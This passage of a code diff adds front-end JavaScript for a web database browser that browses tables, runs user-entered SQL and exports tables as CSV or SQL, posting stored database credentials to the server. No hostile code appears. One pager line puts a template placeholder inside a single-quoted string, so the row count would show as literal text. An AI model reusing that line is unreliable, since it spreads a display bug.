+    const d=await sqlPost('sqlbrowse',{sql_table:table,sql_page:page});
+    if(d.error){el.innerHTML=`<div style="padding:11px 16px;border-bottom:1px solid var(--border)"><button class="btn btn-s" id="sqlBack3" style="font-size:11px">← Tables</button></div><div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;document.getElementById('sqlBack3')?.addEventListener('click',sqlLoadTables);return;}
+    sqlCurrentPage=page;
+    const cols=d.columns||[];const rows=d.rows||[];
+    const thead='<tr>'+cols.map(c=>`<th style="padding:7px 10px;white-space:nowrap;font-size:11px;text-align:left"><span style="font-family:monospace">${esc(c.name)}</span><br><span style="font-weight:400;color:var(--t3);font-size:10px">${esc(c.type)}</span></th>`).join('')+'</tr>';
+    const tbody=rows.map(row=>'<tr>'+row.map(v=>`<td style="padding:6px 10px;font-size:11.5px;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:monospace">${v===null?'<span style="color:var(--t3);font-style:italic">NULL</span>':esc(String(v))}</td>`).join('')+'</tr>').join('');
+    const pages=d.pages||1;
+    const pager=pages>1?`<div style="display:flex;align-items:center;gap:8px"><button class="btn btn-xs btn-g" ${page<=1?'disabled':''} id="sqlPrev">← Prev</button><span style="font-size:12px;color:var(--t2)">Page ${page} / ${pages} &nbsp;(${d.total.toLocaleString()} rows)</span><button class="btn btn-xs btn-g" ${page>=pages?'disabled':''} id="sqlNext">Next →</button></div>`:'<span style="font-size:11px;color:var(--t3)">${d.total.toLocaleString()} rows</span>';
+    el.innerHTML=`
+      <div style="display:flex;align-items:center;gap:8px;padding:10px 16px;border-bottom:1px solid var(--border);flex-wrap:wrap">
+        <button class="btn btn-s" id="sqlBack4" style="font-size:11px">← Tables</button>
+        <span style="font-size:12px;font-weight:600;color:var(--t1);font-family:monospace;flex:1">${esc(table)}</span>
+        <button class="btn btn-xs btn-g" id="sqlExpCsv" style="font-size:11px">↓ CSV</button>
+        <button class="btn btn-xs btn-g" id="sqlExpSql" style="font-size:11px">↓ SQL</button>
+        <button class="btn btn-p" id="sqlQueryBtnB" style="font-size:11px;padding:5px 10px">Run SQL</button>
+      </div>
+      <div style="overflow:auto;max-height:46vh"><table class="log-t" style="width:100%;min-width:max-content"><thead>${thead}</thead><tbody>${tbody||'<tr><td colspan="100" style="padding:24px;text-align:center;color:var(--t3)">Empty table.</td></tr>'}</tbody></table></div>
+      <div style="padding:10px 16px;border-top:1px solid var(--border)">${pager}</div>`;
+    document.getElementById('sqlBack4')?.addEventListener('click',sqlLoadTables);
+    document.getElementById('sqlQueryBtnB')?.addEventListener('click',sqlOpenQuery);
+    document.getElementById('sqlExpCsv')?.addEventListener('click',()=>sqlExportTable('csv'));
+    document.getElementById('sqlExpSql')?.addEventListener('click',()=>sqlExportTable('sql'));
+    document.getElementById('sqlPrev')?.addEventListener('click',()=>sqlBrowseTable(table,page-1));
+    document.getElementById('sqlNext')?.addEventListener('click',()=>sqlBrowseTable(table,page+1));
+  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Error: '+esc(String(e))+'</div>';}
+}
+document.getElementById('sqlRunBtn')?.addEventListener('click',async()=>{
+  const sql=document.getElementById('sqlQueryInput').value.trim();
+  if(!sql){toast('Enter a SQL query.');return;}
+  const btn=document.getElementById('sqlRunBtn');
+  btn.disabled=true;btn.textContent='Running…';
+  const out=document.getElementById('sqlQueryOut');
+  out.innerHTML='<div style="color:var(--t3);padding:12px">Running…</div>';
+  try{
+    const d=await sqlPost('sqlquery',{sql_query:sql});
+    if(d.error){out.innerHTML=`<div style="padding:12px;color:#fca5a5;font-family:monospace;font-size:12px;white-space:pre-wrap">${esc(d.error)}</div>`;btn.disabled=false;btn.textContent='Run Query';return;}
+    if(d.columns&&d.columns.length){
+      const thead='<tr>'+d.columns.map(c=>`<th style="padding:7px 10px;font-size:11px;font-family:monospace;white-space:nowrap;text-align:left">${esc(c)}</th>`).join('')+'</tr>';
+      const tbody=d.rows.map(row=>'<tr>'+row.map(v=>`<td style="padding:6px 10px;font-size:11.5px;font-family:monospace;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${v===null?'<span style="color:var(--t3);font-style:italic">NULL</span>':esc(String(v))}</td>`).join('')+'</tr>').join('');
+      out.innerHTML=(d.limited?'<div style="padding:6px 12px;font-size:11px;color:#f4a333;background:rgba(244,163,51,.1)">Showing first 500 rows.</div>':'')+'<div style="overflow:auto;max-height:38vh"><table class="log-t" style="width:100%;min-width:max-content"><thead>'+thead+'</thead><tbody>'+tbody+'</tbody></table></div><div style="padding:8px 12px;font-size:11px;color:var(--t3)">'+d.rows.length+' row'+(d.rows.length!==1?'s':'')+' returned.</div>';
+    } else {
+      out.innerHTML='<div style="padding:14px;color:var(--green);font-size:13px">✓ Query OK · Affected rows: '+d.affected+(d.insert_id?' · Insert ID: '+d.insert_id:'')+'</div>';
+      if(sqlCurrentTable)sqlBrowseTable(sqlCurrentTable,sqlCurrentPage);else sqlLoadTables();
+    }
+  }catch(e){out.innerHTML='<div style="padding:12px;color:#fca5a5">'+esc(String(e))+'</div>';}
+  btn.disabled=false;btn.textContent='Run Query';
+});
+async function sqlExportTable(fmt){
+  const fd=new FormData();fd.append('csrf_token',CSRF);
+  fd.append('sql_host',sqlCreds.host);fd.append('sql_port',sqlCreds.port);
+  fd.append('sql_user',sqlCreds.user);fd.append('sql_pass',sqlCreds.pass);fd.append('sql_db',sqlCreds.db);
+  fd.append('sql_table',sqlCurrentTable);fd.append('sql_fmt',fmt);
+  try{
+    const r=await fetch('?x=sqlexport',{method:'POST',body:fd});
+    if(!r.ok){toast('Export failed.');return;}
+    const blob=await r.blob();const url=URL.createObjectURL(blob);
+    const a=document.createElement('a');a.href=url;a.download=sqlCurrentTable+'.'+(fmt==='csv'?'csv':'sql');a.click();
+    setTimeout(()=>URL.revokeObjectURL(url),2000);
+  }catch(e){toast('Export error: '+String(e));}
 }
 
 /* HELPERS */
